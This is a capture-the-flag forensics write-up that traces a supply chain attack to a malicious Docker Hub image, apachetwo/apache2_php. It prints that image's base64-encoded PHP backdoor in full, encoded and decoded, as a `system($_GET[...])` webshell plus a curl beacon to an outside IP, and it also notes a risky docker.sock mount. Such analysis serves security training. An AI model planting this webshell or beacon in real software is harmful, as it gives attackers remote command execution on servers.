# Supply chain attack - Docker

## Challenge Details

- Category: Forensics
- Points: 25
- Validation: 1672
- Author: Nishacid
- Status: Done
# Handout
`Supply chain attack - Docker: Awesome WebServer`
`Your DevOps intern has deployed a web server using Docker. Everything seems to be working fine, however several security alerts are coming up from this server, even after reinstallation. Can you look into the source of the problem?`
https://static.root-me.org/forensic/ch36/ch36.zip
## Walkthrough
We are probably looking at an infected docker hub image judging by the challenge details.
Unzipping:
```bash
$ unzip ch36.zip
Archive:  ch36.zip
   creating: awesome_webserver/
  inflating: awesome_webserver/docker-compose.yml
   creating: awesome_webserver/nginx/
   creating: awesome_webserver/nginx/site/
   creating: awesome_webserver/nginx/site/images/
   creating: awesome_webserver/nginx/site/images/banner-images/
  inflating: awesome_webserver/nginx/site/images/banner-images/banner-image-1.jpg
  inflating: awesome_webserver/nginx/site/images/logo-2.png
   creating: awesome_webserver/nginx/site/images/gallery-images/
  inflating: awesome_webserver/nginx/site/images/gallery-images/gallery-image-3.jpg
  inflating: awesome_webserver/nginx/site/images/gallery-images/gallery-image-2.jpg
  inflating: awesome_webserver/nginx/site/images/gallery-images/gallery-image-4.jpg
  inflating: awesome_webserver/nginx/site/images/gallery-images/gallery-image-6.jpg
  inflating: awesome_webserver/nginx/site/images/gallery-images/gallery-image-5.jpg
  inflating: awesome_webserver/nginx/site/images/gallery-images/gallery-image-1.jpg
  inflating: awesome_webserver/nginx/site/images/favicon.ico
  inflating: awesome_webserver/nginx/site/images/logo.png
   creating: awesome_webserver/nginx/site/images/user-images/
  inflating: awesome_webserver/nginx/site/images/user-images/user-1.jpg
  inflating: awesome_webserver/nginx/site/images/user-images/user-2.jpg
  inflating: awesome_webserver/nginx/site/images/user-images/user-3.jpg
  inflating: awesome_webserver/nginx/site/images/dancer.jpg
   creating: awesome_webserver/nginx/site/images/company-images/
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo3.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo2.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo5.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo1.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo7.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo9.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo8.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo4.png
  inflating: awesome_webserver/nginx/site/images/company-images/company-logo6.png
  inflating: awesome_webserver/nginx/site/index.html
   creating: awesome_webserver/nginx/site/js/
  inflating: awesome_webserver/nginx/site/js/jquery.waypoints.min.js
  inflating: awesome_webserver/nginx/site/js/wow.min.js
  inflating: awesome_webserver/nginx/site/js/jquery.1.8.3.min.js
  inflating: awesome_webserver/nginx/site/js/pushy.min.js
  inflating: awesome_webserver/nginx/site/js/lightbox.min.js
  inflating: awesome_webserver/nginx/site/js/site.js
  inflating: awesome_webserver/nginx/site/js/images-loaded.min.js
  inflating: awesome_webserver/nginx/site/js/jquery.scrollUp.min.js
  inflating: awesome_webserver/nginx/site/js/featherlight.gallery.min.js
  inflating: awesome_webserver/nginx/site/js/jquery.easing.min.js
  inflating: awesome_webserver/nginx/site/js/jquery.enllax.min.js
  inflating: awesome_webserver/nginx/site/js/jquery.stickyNavbar.min.js
  inflating: awesome_webserver/nginx/site/js/featherlight.min.js
   creating: awesome_webserver/nginx/site/css/
  inflating: awesome_webserver/nginx/site/css/animate.css
  inflating: awesome_webserver/nginx/site/css/style.css
  inflating: awesome_webserver/nginx/site/css/namari-color.css
  inflating: awesome_webserver/nginx/site/css/font-awesome.css
  inflating: awesome_webserver/nginx/site/css/font-awesome.min.css
   creating: awesome_webserver/nginx/site/fonts/
  inflating: awesome_webserver/nginx/site/fonts/fontawesome-webfont.woff
  inflating: awesome_webserver/nginx/site/fonts/fontawesome-webfont.svg
  inflating: awesome_webserver/nginx/site/fonts/fontawesome-webfont.woff2
  inflating: awesome_webserver/nginx/site/fonts/fontawesome-webfont.eot
  inflating: awesome_webserver/nginx/site/fonts/FontAwesome.otf
  inflating: awesome_webserver/nginx/site/fonts/fontawesome-webfont.ttf
  inflating: awesome_webserver/nginx/site.conf
  inflating: awesome_webserver/README.md
  inflating: awesome_webserver/Dockerfile
```

Let's straightaway look at the docker compose yaml and dockerfile:
```bash
$ cat awesome_webserver/docker-compose.yml
version: '3.5'

services:
  nginx:
    container_name: nginx
    image: nginx:latest
    ports:
      - "5000:80"
    # Source code
    volumes:
        - ./nginx/site.conf:/etc/nginx/conf.d/site.conf
        - ./nginx/site:/var/www/html
    restart: always
    # Hardening
    security_opt:
      - no-new-privileges:true

  jolokia:
    image: bodsch/docker-jolokia:1.6.0
    container_name: jolokia
    # Don't expose JMX
    #ports:
    #  - "8080:8080"
    restart: always

  phpmyadmin:
    image: bitnami/phpmyadmin:latest
    container_name: phpmyadmin
    ports:
      - "3307:8080"
    # Security
    environment:
      - ALLOW_EMPTY_PASSWORD=yes
    restart: always

  mysql:
    container_name: mysql
    build: .
    ports:
      - 3306:3306
    restart: always
    command: bash -c "mysqld"

  hello-world:
    container_name: hello_world
    read_only: true
    image: hello-world:linux

  apache-php:
    container_name: apache2_php
    image: apachetwo/apache2_php:1.5
    ports:
      - "4000:80"
    restart: always
    security_opt:
      - no-new-privileges:true

  tomcat:
    container_name: tomcat
    image: cloudesire/tomcat:8-jre8
    ports:
      - "8080:8080"
    environment:
      - JAVA_OPTS=-Xmx2048m
      - TOMCAT_PASS="p4ssw0rddd:)"

  autoheal:
    image: willfarrell/autoheal
    restart: unless-stopped
    container_name: autoheal
    read_only: true
    environment:
      - AUTOHEAL_CONTAINER_LABEL=all
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

```bash
$ cat awesome_webserver/Dockerfile
FROM debian:latest

ENV SQL_USER="myuser"
ENV SQL_PASS="G00d_P4ssw0rd_sH54Xe7Mz47jMjj"
ENV SQL_DATABASE="myD4t4b4s3"
ENV SQL_TABLE="awesome_table"

ENV DEBIAN_FRONTEND=noninteractive
RUN apt -y update && \
    apt -y install default-mysql-server default-mysql-client

RUN sed -i 's/^.*bind-address.*=.*$/bind-address = 0.0.0.0/g' /etc/mysql/mariadb.conf.d/50-server.cnf

RUN service mysql start;\
    mysql -u root -e "CREATE USER '${SQL_USER}'@'%' IDENTIFIED BY '${SQL_PASS}'; UPDATE mysql.user set plugin = 'mysql_native_password' WHERE User = '${SQL_USER}'; GRANT ALL PRIVILEGES ON *.* TO '${SQL_USER}'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;" ;\
    mysql -u root -e "CREATE DATABASE IF NOT EXISTS '${SQL_DATABASE}'; SET GLOBAL local_infile = true;" ;\
    mysql -u root -e "USE '${SQL_DATABASE}'; CREATE TABLE IF NOT EXISTS '${SQL_TABLE}' (a varchar(255));"

EXPOSE 3306

# Only without docker-compose
# CMD ["mysqld"]
```

Immediately I spot it's running with `/var/run/docker.sock:/var/run/docker.sock`, so that gives the container full privileged access to the docker daemon on the host, extremely dangerous for an infected image.

Let's look at all the images it's pulling:

```bash
 cat awesome_webserver/docker-compose.yml | rg image
    image: nginx:latest
    image: bodsch/docker-jolokia:1.6.0
    image: bitnami/phpmyadmin:latest
    image: hello-world:linux
    image: apachetwo/apache2_php:1.5
    image: cloudesire/tomcat:8-jre8
    image: willfarrell/autoheal
```
Let's look for obvious attacks and not deep rooted vulns in the entire docker system.. to be realistic.
nginx, debin, phpmyadmin, tomcat are all standard, it'd be difficult for our `supply chain attack` to be there. `hello-world` is an official docker image, so probably not there either. `willfarrell/autoheal` is also standard with 100m+ downloads on docker hub.
That leaves jolokia and apachetwo
The official apache docker hub account is `apache`, definitely not apachetwo, this is incredibly suspicious.
Looking at the docker hub account:
https://hub.docker.com/r/apachetwo/

It only has one image: apach2_php, with only 2.8k downloads, this is most definitely the source of our supply chain attack.  Let's pull it.

```bash
$ docker pull apachetwo/apache2_php:1.5
1.5: Pulling from apachetwo/apache2_php
5d2ad2ade881: Pull complete
1d90a9d283a4: Pull complete
675920708c8b: Pull complete
0ab46d4916dc: Pull complete
daa78e654686: Pull complete
e3019d1ad1e3: Pull complete
8376a539f794: Pull complete
cf38c2d4135a: Pull complete
6e89793cb138: Pull complete
30b654e7608b: Pull complete
63722a9a346f: Pull complete
81eb03dc9807: Pull complete
c69ccf66ae42: Pull complete
457853dce201: Pull complete
698edbc78fa3: Pull complete
Digest: sha256:6774ee81298a85d4b601d9b387b5c3c8f0e86c420952906f603340dac8159dab
Status: Downloaded newer image for apachetwo/apache2_php:1.5
docker.io/apachetwo/apache2_php:1.5
```
```json
$ docker inspect  apachetwo/apache2_php:1.5
[
    {
        "Id": "sha256:6774ee81298a85d4b601d9b387b5c3c8f0e86c420952906f603340dac8159dab",
        "RepoTags": [
            "apachetwo/apache2_php:1.5"
        ],
        "RepoDigests": [
            "apachetwo/apache2_php@sha256:6774ee81298a85d4b601d9b387b5c3c8f0e86c420952906f603340dac8159dab"
        ],
        "Created": "2022-10-31T14:11:22.387893466Z",
        "Config": {
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "bash"
            ]
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 310932053,
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:b40ed86654e59e1012e1716d5384910f8c3bb58274b7b00fca564a53e9897ba3",
                "sha256:9be635c6747bd12eed2e47a95a6e217e9671db572652bdaa134757f67cd1250a",
                "sha256:b1e054eefd5c4ca6d4e0bf90836ae1cbead3092d207dc44f0dfbf9e4f4b93fab",
                "sha256:a8401dceb842c7bfa183e8e709389f3d80cfd3cb7b36efb8d604c42d36cf7cb8",
                "sha256:fc2dca09c430df91a434f86d5295766dcc237ae9a83a585e5d554bd7f21fa7ce",
                "sha256:77cbab8d99f4b005aa5304a05869e03858d9f879f559312dd02dea6a6b79878c",
                "sha256:deb2f60206bb843134f2eac289441ea83b96249c7acad3b61511ec9bae9c9109",
                "sha256:ce81f1958411c36c1b7058c096a2b797e48a1e85b9f2b7302907232142a5c4a2",
                "sha256:b17b81d85ab9e0e5c640f6943f51b2e84e91cb7ec1ba435d6bb022e405dd2cf3",
                "sha256:b8b148f2583cc667220d405223ba683c8f22cdc08f26613aa14bd9b3b0f12859",
                "sha256:a6bb1e27ad316ebe8c047eabf0bcedd15f5e47a6bbd5378182cf80512c0c71dc",
                "sha256:bf91b7dce1f5e824b502c088f5bc9c1bec858df8ed9d80c711292ead5cddef5f",
                "sha256:c7ea484a58b0a16b3312a09cf0503cefe7b90ae6020b6c55103539f2448a14cd",
                "sha256:b31d9aca89c1e287e6d48f949efc291c27f66888ac4e8c31551c04ca155a3063",
                "sha256:9c01628860cfac678dd8cde57a5ea00af4265a869a31e7be273bd1a9493c510d"
            ]
        },
        "Metadata": {
            "LastTagTime": "2026-06-16T12:34:06.273309079Z"
        },
        "Descriptor": {
            "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
            "digest": "sha256:6774ee81298a85d4b601d9b387b5c3c8f0e86c420952906f603340dac8159dab",
            "size": 3453
        },
        "Identity": {
            "Pull": [
                {
                    "Repository": "docker.io/apachetwo/apache2_php"
                }
            ]
        }
    }
]
```

Nothing too suspicious in the config and env, let's look at the build history and then we will inspect the fs:

```bash
$ docker history --no-trunc apachetwo/apache2_php:1.5
IMAGE                                                                     CREATED       CREATED BY                                                                                                                                                                                                                                                                            SIZE      COMMENT
sha256:6774ee81298a85d4b601d9b387b5c3c8f0e86c420952906f603340dac8159dab   3 years ago   /bin/sh -c #(nop)  EXPOSE 80                                                                                                                                                                                                                                                          0B
<missing>                                                                 3 years ago   /bin/sh -c echo $(echo "PD9waHAgc3lzdGVtKCRfR0VUW2Jhc2U2NF9kZWNvZGUoJ2NIZHVaV1E9JyldKTtzaGVsbF9leGVjKGJhc2U2NF9kZWNvZGUoJ1kzVnliQ0F0TFhWelpYSXRZV2RsYm5RZ0oxSk5lM1JJTVhOZmN6Tnlkak5TWHpGelgzQlhiak5rZlNjZ2FIUjBjRG92THpFNU9DNDFNUzR4TURBdU5ESXYnKSk7Pz4=" | base64 -d) >> index.php   8.19kB
<missing>                                                                 3 years ago   /bin/sh -c echo "<?php echo('PHP Works !!'); ?>" >> /var/www/html/index.php                                                                                                                                                                                                           20.5kB
<missing>                                                                 3 years ago   /bin/sh -c echo "<?php phpinfo(); ?>" > /var/www/html/info.php                                                                                                                                                                                                                        20.5kB
<missing>                                                                 3 years ago   /bin/sh -c service apache2 restart                                                                                                                                                                                                                                                    36.9kB
<missing>                                                                 3 years ago   /bin/sh -c #(nop) COPY dir:3513fef10b73f1389c38957a3ec5722ed460ff821106a6f4b80fa3e3aa5d854d in /var/www/html/                                                                                                                                                                         20.5kB
<missing>                                                                 3 years ago   /bin/sh -c rm -rf /var/www/html/*                                                                                                                                                                                                                                                     16.4kB
<missing>                                                                 3 years ago   /bin/sh -c chown -R $USER:$USER /var/www/html                                                                                                                                                                                                                                         28.7kB
<missing>                                                                 3 years ago   /bin/sh -c chmod 755 /var/www/html                                                                                                                                                                                                                                                    16.4kB
<missing>                                                                 3 years ago   /bin/sh -c ufw allow 'Apache Full'                                                                                                                                                                                                                                                    28.7kB
<missing>                                                                 3 years ago   /bin/sh -c apt install -y php-common php-xml php-xmlrpc php-curl php-imagick php-dev php-imap php-mbstring php-opcache php-soap php-zip php-intl                                                                                                                                      134MB
<missing>                                                                 3 years ago   /bin/sh -c apt install -y apache2 ufw mariadb-server php libapache2-mod-php php-mysql php-cli                                                                                                                                                                                         380MB
<missing>                                                                 3 years ago   /bin/sh -c apt install -y build-essential curl git htop man unzip vim wget                                                                                                                                                                                                            395MB
<missing>                                                                 3 years ago   /bin/sh -c apt install -y --no-install-recommends tzdata                                                                                                                                                                                                                              7.48MB
<missing>                                                                 3 years ago   /bin/sh -c apt update &&     apt upgrade -y                                                                                                                                                                                                                                           51.6MB
<missing>                                                                 3 years ago   /bin/sh -c export DEBIAN_FRONTEND=noninteractive                                                                                                                                                                                                                                      0B
<missing>                                                                 3 years ago   /bin/sh -c #(nop)  CMD ["bash"]                                                                                                                                                                                                                                                       0B
<missing>                                                                 3 years ago   /bin/sh -c #(nop) ADD file:ff6963f777661fb16cc12fb04a97c558bd94768a6e4ab5bd90e01f3086818853 in /                                                                                                                                                                                      81.6MB
```

Yup there it is, in the second layer, during image build, it base64-decodes a php payload and appends it to `index.php`.
```bash
<missing>                                                                 3 years ago   /bin/sh -c echo $(echo "PD9waHAgc3lzdGVtKCRfR0VUW2Jhc2U2NF9kZWNvZGUoJ2NIZHVaV1E9JyldKTtzaGVsbF9leGVjKGJhc2U2NF9kZWNvZGUoJ1kzVnliQ0F0TFhWelpYSXRZV2RsYm5RZ0oxSk5lM1JJTVhOZmN6Tnlkak5TWHpGelgzQlhiak5rZlNjZ2FIUjBjRG92THpFNU9DNDFNUzR4TURBdU5ESXYnKSk7Pz4=" | base64 -d) >> index.php   8.19kB
```

Let's see what it doing.

```bash
$ echo "PD9waHAgc3lzdGVtKCRfR0VUW2Jhc2U2NF9kZWNvZGUoJ2NIZHVaV1E9JyldKTtzaGVsbF9leGVjKGJhc2U2NF9kZWNvZGUoJ1kzVnliQ0F0TFhWelpYSXRZV2RsYm5RZ0oxSk5lM1JJTVhOZmN6Tnlkak5TWHpGelgzQlhiak5rZlNjZ2FIUjBjRG92THpFNU9DNDFNUzR4TURBdU5ESXYnKSk7Pz4" | base64 -di
<?php system($_GET[base64_decode('cHduZWQ=')]);shell_exec(base64_decode('Y3VybCAtLXVzZXItYWdlbnQgJ1JNe3RIMXNfczNydjNSXzFzX3BXbjNkfScgaHR0cDovLzE5OC41MS4xMDAuNDIv'));?>
```

It's a php backdoor which creates a webshell! Let's decode the inner strings:

```bash
$ echo "cHduZWQ=" | base64 -di
pwned
$ echo "Y3VybCAtLXVzZXItYWdlbnQgJ1JNe3RIMXNfczNydjNSXzFzX3BXbjNkfScgaHR0cDovLzE5OC41MS4xMDAuNDIv" | base64 -di
curl --user-agent 'RM{tH1s_s3rv3R_1s_pWn3d}' http://198.51.100.42/
```

And there's our flag! Basically, this php snippet injected into `index.php` allowed the attacker to achieve rce via a webshell on our server, and because the original docker compose yaml ran it with  `/var/run/docker.sock:/var/run/docker.sock`, the attacker basically has unrestricted access to the docker daemon, and can modify the full application's containers. 
# FLAG
RM{tH1s_s3rv3R_1s_pWn3d}